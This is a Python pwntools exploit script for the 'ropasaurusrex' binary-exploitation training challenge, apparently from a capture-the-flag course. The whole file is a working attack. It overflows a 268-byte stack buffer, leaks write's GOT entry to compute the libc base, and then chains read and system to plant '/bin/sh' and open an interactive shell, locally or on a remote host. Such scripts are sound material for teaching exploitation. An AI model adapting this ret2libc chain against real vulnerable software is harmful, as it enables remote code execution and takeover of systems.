from pwn import *


chall_path = "./ropasaurusrex_patched"
chall = ELF(chall_path)
libc_path = "./downloads/libc-2.39.so" 
libc = ELF(libc_path)

COMMANDS= """
break main
c
"""

if args.REMOTE:
    c = remote("ropasaurusrex.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(chall_path, gdbscript=COMMANDS)
    else:
        c = process(chall_path)

c.recvuntil(b"Input: ")

# step 1
payload = b"A" * 268                  # to reach the saved eip
payload += p32(chall.plt["write"])    # this is equal to write 0x... , address of the procedure in the plt to resolve the write
payload += p32(chall.symbols["main"]) # this is the fake return address, we will start the program again
payload += p32(1)                     # where do we want to print what read
payload += p32(chall.got["write"])    # what we want to write to stdout? the address of the write in the got, our leak
payload += p32(4)                     # how much we want to read

c.send(payload)

libc_leak = c.recv(4)                                       # we receive the leak
libc.address = u32(libc_leak) - libc.symbols["write"] 
print(f"libc base: {hex(libc.address)}")

add_esp_12 = 0x0804901b               # add esp, 0x8; pop ebx; ret

c.recvuntil(b"Input: ")

# step 2: now the main has restarted, we want to write /bin/sh in memory
payload = b"A" * 268                  # to reach the saved eip
payload += p32(libc.symbols["read"])  # we overwrite the saved eip with the address of the read, we don't need anymore the .plt table because we know the base address of the libc and, so, all the functions inside like write, read, system
payload += p32(add_esp_12)            # fake address of the read
payload += p32(0)                     # we want to read from stdin so file descriptor is 0
payload += p32(0x804c300)              # one random address of the section readable and writeable above where to write the /bin/sh
payload += p32(7)                     # how many bytes we want to read from stdin


#step 3: calling system
payload += p32(libc.symbols["system"])
payload += p32(0xdeadbeef)            # fake address of system
payload += p32(0x804c300)             # where we have /bin/sh


c.send(payload)

c.send(b"/bin/sh")


c.interactive()